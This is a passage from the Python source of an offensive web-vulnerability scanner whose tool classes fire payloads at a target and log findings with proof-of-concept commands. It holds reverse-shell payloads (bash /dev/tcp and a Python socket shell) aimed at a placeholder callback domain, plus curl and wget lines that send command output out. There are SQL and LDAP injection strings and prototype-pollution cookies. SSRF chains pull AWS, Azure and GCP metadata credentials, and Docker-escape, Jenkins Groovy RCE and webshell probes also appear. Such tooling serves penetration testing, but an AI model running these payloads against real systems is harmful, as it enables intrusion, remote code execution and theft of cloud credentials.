                        id="OIDC-MISCONFIG",
                        title=f"OIDC misconfiguration at {path}: {', '.join(issues[:2])}",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-287",
                        description=f"OIDC config at {url} (issuer={issuer}):\n" + "\n".join(f"  - {i}" for i in issues),
                        poc_curl=f"curl -sk {url} | python3 -m json.tool",
                        category="Authentication",
                        remediation="Disable implicit flow. Require S256 PKCE. Remove alg=none. Use pairwise subject_type to prevent cross-service tracking."
                    ))
                else:
                    profile.findings.append(Finding(
                        id="OIDC-CONFIG-FOUND",
                        title=f"OpenID configuration exposed: {path}",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-287",
                        description=f"OIDC config at {url}: issuer={issuer}, response_types={rt}",
                        poc_curl=f"curl -sk {url} | python3 -m json.tool",
                        category="Authentication",
                        remediation="Restrict discovery endpoint access if not needed for public clients."
                    ))
                return profile
            except Exception:
                pass
        return profile

# ── Tool 159: Prototype Pollution via Cookie (SKILL-169) ──────
class PrototypePollutionCookie:
    """Test prototype pollution via malformed cookie names containing __proto__."""
    NAME = "Prototype Pollution Cookie"
    PP_COOKIE_TESTS = [
        "__proto__[polluted]=apexcookie",
        "constructor[prototype][polluted]=apexcookie",
        "__proto__.polluted=apexcookie",
        "a[__proto__][polluted]=apexcookie",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for pl in self.PP_COOKIE_TESTS:
            try:
                r = _fetch(profile.url, cfg.ua, cfg.timeout,
                           headers_extra={"Cookie": pl})
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                if "apexcookie" in body:
                    profile.findings.append(Finding(
                        id="PP-COOKIE",
                        title=f"Prototype pollution via cookie name: {pl[:40]}",
                        severity="HIGH",
                        cvss=7.3,
                        cwe="CWE-1321",
                        description=(
                            f"Cookie '{pl}' caused 'apexcookie' to appear in response. "
                            "Server-side cookie parser merges cookie name keys into objects, "
                            "polluting Object.prototype."
                        ),
                        poc_curl=f"curl -sk {profile.url} -H 'Cookie: {pl}'",
                        category="Injection",
                        remediation="Sanitise cookie names before merging into config objects. Use Object.create(null) for cookie parsing. Freeze Object.prototype."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 160: Business Logic — Negative Price / Overflow (SKILL-170)
class BusinessLogicAdvanced:
    """Test advanced business logic flaws: negative prices, integer overflow, coupon stacking."""
    NAME = "Business Logic Advanced"
    BL_TESTS = [
        ("/api/cart",    "POST",  {"quantity": -1, "item_id": "1"},              "negative quantity"),
        ("/api/cart",    "POST",  {"quantity": 2147483648, "item_id": "1"},       "int32 overflow"),
        ("/api/order",   "POST",  {"price": -99.99, "item_id": "1"},              "negative price"),
        ("/api/coupon",  "POST",  {"code": "SAVE10", "amount": -50},              "negative coupon"),
        ("/api/transfer","POST",  {"amount": -100, "to": "attacker"},             "negative transfer"),
        ("/api/refund",  "POST",  {"amount": 9999999, "order_id": "1"},           "oversized refund"),
        ("/api/bid",     "POST",  {"amount": 0.001},                              "sub-cent bid"),
        ("/api/cart",    "POST",  {"quantity": 1, "price": 0.00},                 "zero-price"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path, method, payload, label in self.BL_TESTS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, method,
                           json.dumps(payload).encode(),
                           {"Content-Type": "application/json"})
                if r and r.status in (200, 201):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(k in body for k in ["success", "true", "order_id",
                                               "cart", "id", "transaction"]):
                        profile.findings.append(Finding(
                            id=f"BIZ-LOGIC-{label.replace(' ','_').upper()[:15]}",
                            title=f"Business logic flaw — '{label}' accepted",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-840",
                            description=(
                                f"Endpoint {path} accepted {label} payload {json.dumps(payload)} "
                                f"and returned HTTP {r.status} with success indicators."
                            ),
                            poc_curl=(
                                f"curl -sk -X {method} {url} "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{json.dumps(payload)}'"
                            ),
                            category="Business Logic",
                            remediation=f"Validate all numeric inputs server-side: enforce positive quantities, minimum prices, maximum refund bounds. Apply business rule constraints at the API layer."
                        ))
            except Exception:
                pass
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 161-210 — 50 Black Team Skills (Phase 12)
# ══════════════════════════════════════════════════════════════

class RCEVerificationChain:
    """Generate OOB DNS-callback RCE verification payloads for confirmed injection points."""
    NAME = "RCE Verification Chain"
    OOB_DOMAIN = "YOUR_OOB_DOMAIN.burpcollaborator.net"
    SHELLS = [
        ("bash",   "bash+-c+'bash+-i+>%26+/dev/tcp/{oob}/443+0>%261'"),
        ("curl",   "curl+http://rce.{host}.{oob}/$(id)"),
        ("wget",   "wget+http://rce.{host}.{oob}/$(whoami)"),
        ("python", "python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"{oob}\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
        ("nslookup","nslookup+$(id).{host}.{oob}"),
        ("ping",   "ping+-c+1+$(uname+-a|base64|tr+-d+\\'\\n\\').{oob}"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        oob = self.OOB_DOMAIN
        host = profile.host
        chains = []
        for shell, tmpl in self.SHELLS:
            payload = tmpl.format(oob=oob, host=host)
            chains.append(f"  [{shell}] {payload}")
        profile.findings.append(Finding(
            id="RCE-VRF-001",
            title="RCE Verification — OOB DNS Callback Payloads Generated",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-78",
            description=(
                f"Generated {len(self.SHELLS)} OOB DNS-callback RCE verification payloads for {host}. "
                "Replace YOUR_OOB_DOMAIN with your Burp Collaborator / interactsh domain and inject "
                "into any confirmed command injection, SSTI, or deserialization point to verify OOB execution."
            ),
            evidence="\n".join(chains),
            poc_curl=(
                f"# Inject into confirmed injection point:\n"
                f"curl -sk 'https://{host}/api/cmd?cmd=curl+http://rce.{host}.{oob}/$(id)'"
            ),
            category="RCE",
            remediation="Use interactsh (https://app.interactsh.com) or Burp Collaborator to detect DNS callbacks. Each shell variant targets a different interpreter; monitor all."
        ))
        return profile


class ShellUploadPathDetector:
    """Probe for webshell upload paths and common backdoor locations."""
    NAME = "Shell Upload Path Detector"
    SHELL_PATHS = [
        "/uploads/shell.php", "/upload/cmd.php", "/files/shell.php",
        "/assets/shell.php", "/images/shell.php", "/static/shell.php",
        "/media/shell.php", "/tmp/shell.php", "/shell.php", "/cmd.php",
        "/webshell.php", "/c99.php", "/r57.php", "/b374k.php",
        "/uploads/shell.jsp", "/shell.jsp", "/cmd.aspx", "/shell.aspx",
        "/uploads/shell.asp", "/.htaccess.bak", "/web.config.bak",
        "/config.php.bak", "/index.php~", "/config.bak",
        "/backup.zip", "/backup.tar.gz", "/site.zip", "/www.zip",
        "/.bash_history", "/.ssh/id_rsa", "/proc/self/environ",
        "/etc/passwd", "/etc/shadow", "/windows/win.ini",
        "/windows/system32/drivers/etc/hosts",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        found = []
        for path in self.SHELL_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 206):
                    body = (r.body or b"")[:200].decode("utf-8", errors="replace")
                    if any(sig in body.lower() for sig in [
                        "root:", "bin/bash", "eval(", "system(", "exec(",
                        "passthru", "<?php", "<%@", "shell_exec",
                        "uid=", "gid=", "[fonts]", "[extensions]"
                    ]):
                        found.append((path, r.status, body[:80]))
            except Exception:
                pass
        if found:
            for path, code, snippet in found:
                profile.findings.append(Finding(
                    id=f"SHELL-UPLOAD-{path.replace('/','_').strip('_')[:20].upper()}",
                    title=f"Backdoor/Sensitive file accessible: {path}",
                    severity="CRITICAL",
                    cvss=9.8,
                    cwe="CWE-434",
                    description=f"Path {path} returned HTTP {code} with sensitive content indicators.",
                    evidence=f"HTTP {code} | snippet: {snippet}",
                    poc_curl=f"curl -sk '{base}{path}'",
                    category="Webshell/Backdoor",
                    remediation="Remove backdoor files immediately, audit upload directory permissions, restrict execute permissions on upload folders, add server-side MIME type validation."
                ))
        return profile


class TimingBasedSQLiExtractor:
    """Detect blind time-based SQLi via response time differential across payloads."""
    NAME = "Timing-Based SQLi Extractor"
    PAYLOADS = [
        ("MySQL-sleep",    "' AND SLEEP(4)-- -",              4.0),
        ("MySQL-benchmark","' AND BENCHMARK(10000000,MD5(1))-- -", 3.0),
        ("MSSQL-waitfor",  "'; WAITFOR DELAY '0:0:4'-- -",    4.0),
        ("PostgreSQL-pg",  "'; SELECT pg_sleep(4);--",         4.0),
        ("Oracle-ctxsys",  "' AND 1=(SELECT 1 FROM dual WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),4)=1)-- -", 4.0),
        ("SQLite-sleep",   "' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(150000000)))) ELSE 0 END)-- -", 3.5),
    ]
    PARAMS = ["id", "user", "search", "q", "query", "name", "email", "page",
              "cat", "category", "product", "item", "order", "sort", "filter"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for param in self.PARAMS:
            # baseline timing
            baseline_url = f"{base}/?{param}=1"
            try:
                t0 = time.time()
                _fetch(baseline_url, cfg.ua, 8)
                baseline = time.time() - t0
            except Exception:
                baseline = 1.0
            for db, payload, expected_delay in self.PAYLOADS:
                import urllib.parse
                enc = urllib.parse.quote(payload)
                url = f"{base}/?{param}={enc}"
                try:
                    t0 = time.time()
                    _fetch(url, cfg.ua, int(expected_delay) + 6)
                    elapsed = time.time() - t0
                    delta = elapsed - baseline
                    if delta >= expected_delay * 0.7:
                        profile.findings.append(Finding(
                            id=f"SQLI-TIMING-{db.upper()[:12]}-{param.upper()[:8]}",
                            title=f"Blind Time-Based SQLi — {db} via ?{param}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-89",
                            description=(
                                f"Parameter '{param}' caused {delta:.1f}s delay (baseline {baseline:.2f}s) "
                                f"with {db} payload. Indicates blind SQL injection."
                            ),
                            evidence=f"Baseline: {baseline:.2f}s | Injected: {elapsed:.2f}s | Delta: {delta:.2f}s",
                            poc_curl=f"curl -sk '{url}'",
                            category="SQL Injection",
                            remediation="Use parameterised queries / prepared statements. Never interpolate user input into SQL strings."
                        ))
                        break
                except Exception:
                    pass
        return profile


class LDAPPrivescChain:
    """Detect LDAP injection → group enumeration → privilege escalation path analysis."""
    NAME = "LDAP Privesc Chain"
    LDAP_PAYLOADS = [
        ("always-true",  "*)(uid=*))(|(uid=*",    "admin"),
        ("wildcard",     "*",                       "user"),
        ("bypass",       "admin)(&(password=*",    "login"),
        ("enum-cn",      "*))(cn=*",               "search"),
        ("dump-all",     "*))%00",                 "filter"),
        ("inject-or",    "x)(|(cn=admin)(cn=*",    "group"),
    ]
    LDAP_PARAMS = ["username", "user", "uid", "cn", "filter", "search",
                   "query", "login", "email", "dn", "group", "role"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for param in self.LDAP_PARAMS:
            for label, payload, context in self.LDAP_PAYLOADS:
                import urllib.parse
                url = f"{base}/api/{context}?{param}={urllib.parse.quote(payload)}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               f"{param}={urllib.parse.quote(payload)}".encode(),
                               {"Content-Type": "application/x-www-form-urlencoded"})
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body.lower() for sig in [
                            "admin", "cn=", "dc=", "ou=", "dn:", "objectclass",
                            "uid=", "member", "groupofnames", "distinguished"
                        ]):
                            profile.findings.append(Finding(
                                id=f"LDAP-INJECT-{label.upper()[:12]}-{param.upper()[:8]}",
                                title=f"LDAP Injection → Privesc Path — {label} via {param}",
                                severity="CRITICAL",
                                cvss=9.1,
                                cwe="CWE-90",
                                description=(
                                    f"LDAP payload '{payload}' in parameter '{param}' ({context}) "
                                    f"returned LDAP directory content. Full directory enumeration and "
                                    f"privilege escalation possible via DN manipulation."
                                ),
                                evidence=body[:200],
                                poc_curl=(
                                    f"curl -sk -X POST {base}/api/{context} "
                                    f"-d '{param}={urllib.parse.quote(payload)}'"
                                ),
                                category="LDAP Injection",
                                remediation="Use LDAP parameterised queries; escape all special chars: *, (, ), \\, NUL. Apply allowlist validation on LDAP filter inputs."
                            ))
                            break
                except Exception:
                    pass
        return profile


class NTLMHashLeakDetect:
    """Detect NTLM authentication challenge exposure in HTTP response headers."""
    NAME = "NTLM Hash Leak Detector"
    NTLM_PATHS = ["/", "/owa/", "/autodiscover/", "/ecp/", "/mapi/",
                  "/rpc/", "/EWS/", "/exchange/", "/api/", "/admin/",
                  "/wp-admin/", "/webmail/", "/mail/", "/login"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.NTLM_PATHS:
            url = base + path
            for headers in [
                {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="},
                {"Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA="},
            ]:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, extra_headers=headers)
                    if r:
                        www_auth = (r.headers.get("www-authenticate","") or
                                    r.headers.get("WWW-Authenticate",""))
                        if "ntlm" in www_auth.lower() or "negotiate" in www_auth.lower():
                            profile.findings.append(Finding(
                                id=f"NTLM-LEAK-{path.replace('/','_').strip('_')[:16].upper()}",
                                title=f"NTLM Authentication Exposure at {path}",
                                severity="HIGH",
                                cvss=7.5,
                                cwe="CWE-287",
                                description=(
                                    f"NTLM/Negotiate authentication challenge detected at {url}. "
                                    "Enables NetNTLM hash capture via Responder when combined with "
                                    "SSRF or XXE — captures admin credentials for offline cracking."
                                ),
                                evidence=f"WWW-Authenticate: {www_auth[:120]}",
                                poc_curl=(
                                    f"curl -sk -H 'Authorization: NTLM TlRMTVNTUAABAAAAB4IIAA==' "
                                    f"'{url}' -v 2>&1 | grep -i 'www-authenticate'"
                                ),
                                category="NTLM",
                                remediation="Disable NTLM authentication on public-facing endpoints. Enforce Kerberos or OAuth2 for SSO. Block NTLM at the WAF layer."
                            ))
                            break
                except Exception:
                    pass
        return profile


class AzureIMDSChain:
    """Generate SSRF → Azure IMDS v1/v2 → managed identity token exploit chain."""
    NAME = "Azure IMDS Chain"
    IMDS_PATHS = [
        ("v1-metadata",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                           {"Metadata": "true"}),
        ("v1-identity",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                           {"Metadata": "true"}),
        ("v1-subscription","http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
                           {"Metadata": "true"}),
        ("v2-identity",    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://vault.azure.net",
                           {"Metadata": "true"}),
    ]
    SSRF_PARAMS = ["url", "fetch", "proxy", "redirect", "resource", "endpoint",
                   "target", "dest", "link", "src", "image", "load", "callback"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for variant, imds_url, req_headers in self.IMDS_PATHS:
            enc = urllib.parse.quote(imds_url)
            for param in self.SSRF_PARAMS:
                ssrf_url = f"{base}?{param}={enc}"
                payload_burp = (
                    f"GET /?{param}={enc} HTTP/1.1\r\n"
                    f"Host: {profile.host}\r\n"
                    f"Metadata: true\r\n\r\n"
                )
                profile.findings.append(Finding(
                    id=f"AZURE-IMDS-{variant.upper()[:14]}-{param.upper()[:6]}",
                    title=f"SSRF → Azure IMDS {variant} Chain via ?{param}",
                    severity="CRITICAL",
                    cvss=9.9,
                    cwe="CWE-918",
                    description=(
                        f"If SSRF confirmed via ?{param}, inject Azure IMDS endpoint "
                        f"({variant}) to retrieve managed identity access token granting "
                        f"full Azure control plane access (subscription, Key Vault, Storage)."
                    ),
                    evidence=(
                        f"SSRF URL: {ssrf_url}\n"
                        f"IMDS Target: {imds_url}\n"
                        f"Expected response: {{\"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGci...\"}}"
                    ),
                    poc_curl=(
                        f"# Step 1 — Verify SSRF via OOB:\n"
                        f"curl -sk '{base}?{param}=http://YOUR_OOB_DOMAIN.burpcollaborator.net/'\n"
                        f"# Step 2 — Exploit via Azure IMDS:\n"
                        f"curl -sk '{ssrf_url}' -H 'Metadata: true'"
                    ),
                    category="SSRF → Cloud Pivot",
                    remediation="Block IMDS at network layer (SSRF egress filtering). Use IMDSv2 with PUT token. Apply outbound firewall rules blocking 169.254.169.254."
                ))
                break  # one param per IMDS variant is sufficient for the PoC
        return profile


class AWSIMDSChain:
    """Generate SSRF → AWS IMDSv1/v2 → IAM credential exfiltration chain."""
    NAME = "AWS IMDS Chain"
    IMDS_PATHS = [
        ("v1-creds",    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("v1-role",     "http://169.254.169.254/latest/meta-data/iam/info"),
        ("v2-token",    "http://169.254.169.254/latest/api/token"),
        ("v1-userdata", "http://169.254.169.254/latest/user-data"),
        ("v1-hostname", "http://169.254.169.254/latest/meta-data/hostname"),
        ("v1-account",  "http://169.254.169.254/latest/dynamic/instance-identity/document"),
    ]
    SSRF_PARAMS = ["url", "fetch", "proxy", "redirect", "resource", "endpoint",
                   "target", "dest", "callback", "webhook", "load", "src"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for variant, imds_url in self.IMDS_PATHS[:3]:
            enc = urllib.parse.quote(imds_url)
            param = self.SSRF_PARAMS[0]
            profile.findings.append(Finding(
                id=f"AWS-IMDS-{variant.upper()[:14]}",
                title=f"SSRF → AWS IMDS {variant} — IAM Credential Theft Chain",
                severity="CRITICAL",
                cvss=9.9,
                cwe="CWE-918",
                description=(
                    f"If SSRF confirmed, inject AWS IMDS endpoint ({variant}) to retrieve "
                    "IAM role credentials (AccessKeyId, SecretAccessKey, Token) granting "
                    "full AWS API access. Combine with IMDSv2 X-aws-ec2-metadata-token bypass."
                ),
                evidence=(
                    f"Target: {imds_url}\n"
                    f"Step 1 — Get role name: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                    f"Step 2 — Get creds: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n"
                    f"Step 3 — Use creds: aws sts get-caller-identity --profile stolen"
                ),
                poc_curl=(
                    f"# IMDSv1 (no token required):\n"
                    f"curl -sk '{base}?{param}={enc}'\n"
                    f"# IMDSv2 bypass (PUT token first):\n"
                    f"TOKEN=$(curl -sk -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
                    f"'http://169.254.169.254/latest/api/token') && "
                    f"curl -sk -H \"X-aws-ec2-metadata-token: $TOKEN\" "
                    f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
                ),
                category="SSRF → Cloud Pivot",
                remediation="Block 169.254.169.254 in egress firewall rules. Enforce IMDSv2 (require token). Apply least-privilege IAM roles. Use VPC endpoint policies."
            ))
        return profile


class GCPMetadataChain:
    """Generate SSRF → GCP metadata API → service account token chain."""
    NAME = "GCP Metadata Chain"
    GCP_PATHS = [
        ("sa-token",   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                       {"Metadata-Flavor": "Google"}),
        ("sa-email",   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
                       {"Metadata-Flavor": "Google"}),
        ("project-id", "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                       {"Metadata-Flavor": "Google"}),
        ("ssh-keys",   "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
                       {"Metadata-Flavor": "Google"}),
        ("alt-ip",     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
                       {"Metadata-Flavor": "Google"}),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for variant, gcp_url, req_headers in self.GCP_PATHS[:3]:
            enc = urllib.parse.quote(gcp_url)
            profile.findings.append(Finding(
                id=f"GCP-META-{variant.upper()[:14]}",
                title=f"SSRF → GCP Metadata {variant} — Service Account Token Chain",
                severity="CRITICAL",
                cvss=9.9,
                cwe="CWE-918",
                description=(
                    f"If SSRF confirmed, inject GCP metadata endpoint ({variant}) to retrieve "
                    "OAuth2 access_token for the instance service account. Token grants GCP API "
                    "access to Cloud Storage, GKE, BigQuery, etc."
                ),
                evidence=(
                    f"Metadata Target: {gcp_url}\n"
                    f"Required header: Metadata-Flavor: Google\n"
                    f"Expected: {{\"access_token\": \"ya29.xxx\", \"token_type\": \"Bearer\"}}"
                ),
                poc_curl=(
                    f"curl -sk '{base}?url={enc}' -H 'Metadata-Flavor: Google'\n"
                    f"# Or direct if host has SSRF:\n"
                    f"curl -sk '{gcp_url}' -H 'Metadata-Flavor: Google'"
                ),
                category="SSRF → Cloud Pivot",
                remediation="Block metadata.google.internal and 169.254.169.254 in egress. Use Workload Identity Federation instead of service account keys. Apply metadata server access controls."
            ))
        return profile


class K8sAPIDetector:
    """Detect exposed Kubernetes API server and RBAC misconfigurations."""
    NAME = "K8s API Server Detector"
    K8S_PATHS = [
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/secrets",
        "/api/v1/configmaps",
        "/api/v1/serviceaccounts",
        "/api/v1/nodes",
        "/apis/apps/v1/deployments",
        "/apis/rbac.authorization.k8s.io/v1/clusterroles",
        "/version",
        "/healthz",
        "/metrics",
        "/openapi/v2",
    ]
    K8S_PORTS = [6443, 8443, 8080, 10250, 10255, 2379]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.K8S_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"apiVersion"', '"kind"', '"items"', '"metadata"',
                        '"namespace"', 'kubernetes', '"clusterName"',
                        '"gitVersion"', "Unauthorized", "Forbidden"
                    ]):
                        sev = "CRITICAL" if r.status == 200 else "HIGH"
                        cvss = 10.0 if r.status == 200 else 7.5
                        profile.findings.append(Finding(
                            id=f"K8S-API-{path.replace('/','_').strip('_')[:20].upper()}",
                            title=f"Kubernetes API Exposed: {path} (HTTP {r.status})",
                            severity=sev,
                            cvss=cvss,
                            cwe="CWE-284",
                            description=(
                                f"Kubernetes API endpoint {path} returned HTTP {r.status} "
                                "indicating an exposed or misconfigured K8s cluster. "
                                "Unauthenticated access allows cluster compromise: secret exfil, "
                                "pod exec, lateral movement to cloud IAM."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Enumerate secrets:\n"
                                f"kubectl --server=https://{profile.host} --insecure-skip-tls-verify "
                                f"get secrets --all-namespaces 2>/dev/null"
                            ),
                            category="K8s / Container",
                            remediation="Bind K8s API server to internal IPs only. Enable RBAC. Disable anonymous authentication (--anonymous-auth=false). Rotate all secrets."
                        ))
            except Exception:
                pass
        return profile


class DockerAPIDaemonExposed:
    """Detect exposed Docker daemon API (TCP 2375/2376) via HTTP probe."""
    NAME = "Docker API Daemon Exposed"
    DOCKER_PATHS = [
        "/v1.41/info", "/v1.41/version", "/v1.41/containers/json",
        "/v1.41/images/json", "/v1.41/volumes", "/v1.41/networks",
        "/v1.41/secrets", "/v1.41/_ping",
        "/info", "/version", "/containers/json",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.DOCKER_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"DockerRootDir"', '"ServerVersion"', '"Containers"',
                        '"Images"', '"KernelVersion"', "DOCKER_", '"Id"',
                        '"Architecture"', '"OSType"', "docker"
                    ]):
                        profile.findings.append(Finding(
                            id=f"DOCKER-API-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Docker Daemon API Exposed: {path}",
                            severity="CRITICAL",
                            cvss=10.0,
                            cwe="CWE-284",
                            description=(
                                f"Docker API endpoint {path} is publicly accessible without authentication. "
                                "Full container control: create privileged containers, mount host filesystem, "
                                "escape to root on host OS via --privileged or --volume /:/mnt/host."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Escape to host root:\n"
                                f"curl -sk -X POST '{base}/v1.41/containers/create' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{{\"Binds\":[\"/:/mnt/host\"],\"Privileged\":true}}}}'"
                            ),
                            category="K8s / Container",
                            remediation="Bind Docker daemon to Unix socket only (never TCP without mTLS). Add --host=unix:///var/run/docker.sock. Block port 2375/2376 at firewall."
                        ))
                        break
            except Exception:
                pass
        return profile


class JenkinsRCEDetector:
    """Detect Jenkins script console, Groovy RCE surface, and unauthenticated endpoints."""
    NAME = "Jenkins RCE Detector"
    JENKINS_PATHS = [
        ("/script",           "Script Console — Direct Groovy RCE"),
        ("/scriptText",       "Script Console POST endpoint — Direct Groovy RCE"),
        ("/manage",           "Management Interface Exposed"),
        ("/computer/",        "Agent/Node List Exposed"),
        ("/asynchPeople/",    "User Enumeration via asynchPeople"),
        ("/api/json",         "Jenkins REST API Unauthenticated"),
        ("/api/xml",          "Jenkins XML API Unauthenticated"),
        ("/credentials/",     "Credentials Store Exposed"),
        ("/configure",        "Global Configuration Exposed"),
        ("/job/",             "Job List Exposed"),
        ("/view/all/",        "All Jobs View Exposed"),
        ("/pluginManager/",   "Plugin Manager Exposed — install arbitrary plugins"),
        ("/securityRealm/",   "Security Realm Configuration"),
        ("/me/api/json",      "Current User API"),
        ("/whoAmI/api/json",  "Anonymous User Identity Check"),
        ("/queue/api/json",   "Build Queue Exposed"),
        ("/overallLoad/api/json", "System Load Metrics"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path, desc in self.JENKINS_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 405):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "Jenkins", "hudson", "Groovy", "groovy",
                        "Script Console", "Manage Jenkins", "Build History",
                        "crumb", "Jenkins-Crumb", "j_username", "j_password",
                        '"_class"', "hudson.model"
                    ]):
                        sev = "CRITICAL" if "script" in path.lower() or "credentials" in path.lower() else "HIGH"
                        profile.findings.append(Finding(
                            id=f"JENKINS-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Jenkins {desc}",
                            severity=sev,
                            cvss=9.8 if sev == "CRITICAL" else 7.5,
                            cwe="CWE-284",
                            description=(
                                f"Jenkins endpoint {path} is accessible (HTTP {r.status}). "
                                f"{desc}. "
                                "Jenkins script console provides direct Groovy code execution "
                                "on the server — equivalent to OS-level RCE."
                            ),
                            evidence=body[:200],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Groovy RCE via script console:\n"
                                f"curl -sk -X POST '{base}/scriptText' "
                                f"-d 'script=println+\"id\".execute().text'"
                            ),
                            category="Jenkins / CI-CD",
                            remediation="Restrict Jenkins to internal network. Enable authentication (Matrix-based security). Disable CLI remoting. Apply CSRF protection. Run Jenkins behind reverse proxy with auth."
                        ))
            except Exception:
                pass
        return profile


class GitLabTokenScanner:
    """Scan for exposed GitLab tokens, CI/CD variables, and repository secrets."""
    NAME = "GitLab Token Scanner"
    GITLAB_PATHS = [
        "/.gitlab-ci.yml", "/gitlab-ci.yml", "/.env.gitlab",
        "/api/v4/projects", "/api/v4/users", "/api/v4/groups",
        "/api/v4/admin/users", "/-/graphql",
        "/users/sign_in", "/-/profile/personal_access_tokens",
        "/admin/users", "/admin/application_settings",
        "/explore/projects", "/explore/groups",
        "/.git/config", "/.git/HEAD",
    ]
    GITLAB_TOKEN_PATTERNS = [
        r'glpat-[A-Za-z0-9\-_]{20}',
        r'glptt-[A-Za-z0-9]{40}',
        r'GR1348941[A-Za-z0-9\-_]{20}',
        r'"private_token"\s*:\s*"[A-Za-z0-9\-_]{20}"',
        r'GITLAB_TOKEN["\s]*[:=]["\s]*([A-Za-z0-9\-_]{20,})',
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        for path in self.GITLAB_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    for pat in self.GITLAB_TOKEN_PATTERNS:
                        m = re.search(pat, body)
                        if m:
                            profile.findings.append(Finding(
                                id=f"GITLAB-TOKEN-{path.replace('/','_').strip('_')[:16].upper()}",
                                title=f"GitLab Token/Secret Exposed at {path}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-798",
                                description=(
                                    f"GitLab personal access token or CI/CD secret found at {path}. "
                                    "Token grants full API access: repo read/write, user impersonation, "
                                    "runner registration, deployment pipeline control."
                                ),
                                evidence=f"Match: {m.group(0)[:60]}",
                                poc_curl=(
                                    f"curl -sk '{url}'\n"
